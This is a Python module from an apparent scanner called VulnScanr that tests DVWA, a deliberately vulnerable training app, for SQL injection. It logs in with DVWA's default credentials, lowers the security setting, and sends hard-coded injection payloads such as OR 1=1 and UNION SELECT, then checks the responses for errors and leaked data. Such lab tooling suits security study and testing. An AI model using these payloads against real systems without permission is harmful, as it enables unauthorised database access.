"""
SQL Injection Scanner Module for VulnScanr
Specialized for DVWA testing
"""
import time
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin
from src.utils.logger import setup_logger

class SQLInjectionScanner:
    def __init__(self, session, target_url, verbose=False):
        self.session = session
        self.target_url = target_url
        self.verbose = verbose
        self.logger = setup_logger(verbose)
        
        # Common SQL injection payloads
        self.payloads = [
            "' OR '1'='1",
            "' OR '1'='1' -- ",
            "' OR '1'='1' /*",
            "admin' --",
            "admin' #",
            "' UNION SELECT 1,2,3 -- ",
            "' AND 1=1 -- ",
            "' AND 1=2 -- ",
            "1' ORDER BY 1 -- ",
            "1' ORDER BY 10 -- ",
        ]

        self.vulnerabilities_found = []  # Track found vulnerabilities

    def dvwa_login(self):
        """
        Login to DVWA with proper CSRF token handling
        Returns: Boolean - True if login successful
        """
        try:
            self.logger.info("🔐 Attempting to login to DVWA...")
            
            login_url = urljoin(self.target_url, "/login.php")
            
            # First, get the login page to capture CSRF token
            get_response = self.session.get(login_url)
            
            if get_response.status_code != 200:
                self.logger.error(f"❌ Failed to access login page. Status: {get_response.status_code}")
                return False
            
            # Parse the HTML to find CSRF token
            soup = BeautifulSoup(get_response.text, 'html.parser')
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            
            if not csrf_token_input:
                self.logger.error("❌ Could not find CSRF token on login page")
                return False
                
            csrf_token = csrf_token_input.get('value')
            self.logger.debug(f"📋 Found CSRF token: {csrf_token}")
            
            # Prepare login data
            login_data = {
                "username": "admin",
                "password": "password", 
                "Login": "Login",
                "user_token": csrf_token
            }
            
            # Submit login form
            post_response = self.session.post(login_url, data=login_data)
            
            # Check if login was successful
            if "Login failed" in post_response.text:
                self.logger.error("❌ Login failed - Incorrect username/password")
                return False
            elif "PHPSESSID" in self.session.cookies:
                self.logger.info("✅ Successfully logged into DVWA")
                
                # Set security level to low
                self.set_dvwa_security_low()
                return True
            else:
                self.logger.error("❌ Login failed - Unknown reason")
                return False
                
        except Exception as e:
            self.logger.error(f"💥 Login error: {str(e)}")
            return False

    def set_dvwa_security_low(self):
        """
        Set DVWA security level to low for testing
        """
        try:
            security_url = urljoin(self.target_url, "/security.php")
            
            # Get security page
            response = self.session.get(security_url)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Find CSRF token
            csrf_token_input = soup.find('input', {'name': 'user_token'})
            if not csrf_token_input:
                self.logger.warning("⚠️ Could not find CSRF token on security page")
                return
                
            csrf_token = csrf_token_input.get('value')
            
            # Set security to low
            security_data = {
                "security": "low",
                "seclev_submit": "Submit",
                "user_token": csrf_token
            }
            
            response = self.session.post(security_url, data=security_data)
            
            if "Security level is currently: low" in response.text:
                self.logger.info("✅ DVWA security level set to LOW")
            else:
                self.logger.warning("⚠️ Could not verify security level change")
                
        except Exception as e:
            self.logger.warning(f"⚠️ Could not set security level: {str(e)}")

    def test_dvwa_sqli(self):
        """
        Test DVWA's SQL Injection vulnerability page
        Returns: Boolean - True if vulnerabilities found
        """
        self.logger.info("🎯 Testing DVWA SQL Injection page...")
        self.vulnerabilities_found = []  # Reset findings
        
        # Login first
        if not self.dvwa_login():
            self.logger.error("🚫 Cannot proceed without DVWA login")
            return False
        
        # Test SQL Injection page
        sqli_url = urljoin(self.target_url, "/vulnerabilities/sqli/")
        vulnerabilities_found = 0
        
        # Test payloads for the ID parameter
        test_payloads = [
            "1",                    # Normal input
            "1'",                   # Basic SQL break
            "1' OR '1'='1",         # Always true
            "1' OR '1'='1' -- ",    # Comment out rest
            "1' UNION SELECT 1,2 -- ",  # Union injection
            "1' AND 1=1 -- ",       # Boolean true
            "1' AND 1=2 -- ",       # Boolean false
            "admin' OR '1'='1",     # String-based injection
        ]
        
        for payload in test_payloads:
            try:
                self.logger.debug(f"🧪 Testing payload: {payload}")
                
                # Send request with payload
                params = {"id": payload, "Submit": "Submit"}
                response = self.session.get(sqli_url, params=params)
                
                # Check for successful injection
                if self.is_sql_injection_successful(response.text, payload):
                    self.logger.warning(f"💉 SQL INJECTION VULNERABILITY FOUND!")
                    self.logger.warning(f"   Payload: {payload}")
                    self.logger.warning(f"   URL: {sqli_url}")
                    self.vulnerabilities_found.append((payload, sqli_url))  # Track finding
                    vulnerabilities_found += 1
                    
            except Exception as e:
                self.logger.error(f"❌ Error testing payload {payload}: {str(e)}")
        
        # Report results
        if vulnerabilities_found > 0:
            self.logger.warning(f"🎯 Found {vulnerabilities_found} SQL injection vulnerabilities!")
            return True
        else:
            self.logger.info("✅ No SQL injection vulnerabilities detected")
            return False

    def is_sql_injection_successful(self, response_text, payload):
        """
        Detect if SQL injection was successful based on response
        """
        # SQL error patterns (definite indicators)
        error_indicators = [
            "mysql_fetch_array()",
            "You have an error in your SQL syntax",
            "Warning: mysql",
            "MySQL server version",
            "SQL syntax",
            "unexpected end",
            "unknown column",
            "supplied argument is not a valid MySQL",
        ]
        
        # Success patterns (data leakage) - only count if we see actual database data
        success_indicators = [
            "First name:",
            "Surname:",
            "ID:",
        ]
        
        # Check for definite SQL errors first
        for error in error_indicators:
            if error.lower() in response_text.lower():
                self.logger.debug(f"   Found SQL error: {error}")
                return True
        
        # Check for successful data extraction - be more strict
        for success in success_indicators:
            if success.lower() in response_text.lower():
                # Only return true if we see the pattern AND it's not a normal response
                if payload != "1":  # Not the normal input
                    self.logger.debug(f"   Found data leakage: {success}")
                    return True
        
        # Boolean-based blind SQLi detection
        if "' AND 1=1 -- " in payload and "First name" in response_text:
            self.logger.debug("   Boolean-based SQLi detected (1=1 true)")
            return True
        if "' AND 1=2 -- " in payload and "First name" not in response_text:
            self.logger.debug("   Boolean-based SQLi detected (1=2 false)")
            return True
            
        # Check for different responses between normal and injected payloads
        if payload == "1" and "First name" in response_text:
            self.normal_response = True  # Store that normal input works
        elif payload != "1" and "First name" in response_text:
            # If we get data with an injected payload, it's likely SQLi
            self.logger.debug("   Data returned with injected payload")
            return True
            
        return False

    def test_url(self, url, params=None):
        """
        Legacy method for generic URL testing
        """
        self.logger.debug(f"🔍 Testing URL: {url}")
        
        for payload in self.payloads:
            try:
                test_url = f"{url}?id={payload}"
                response = self.session.get(test_url)
                
                if self.is_sql_injection_successful(response.text, payload):
                    self.logger.warning(f"⚠️ Possible SQLi vulnerability!")
                    self.logger.warning(f"   Payload: {payload}")
                    return True
                    
            except Exception as e:
                self.logger.error(f"Error testing {url}: {e}")
        
        return False
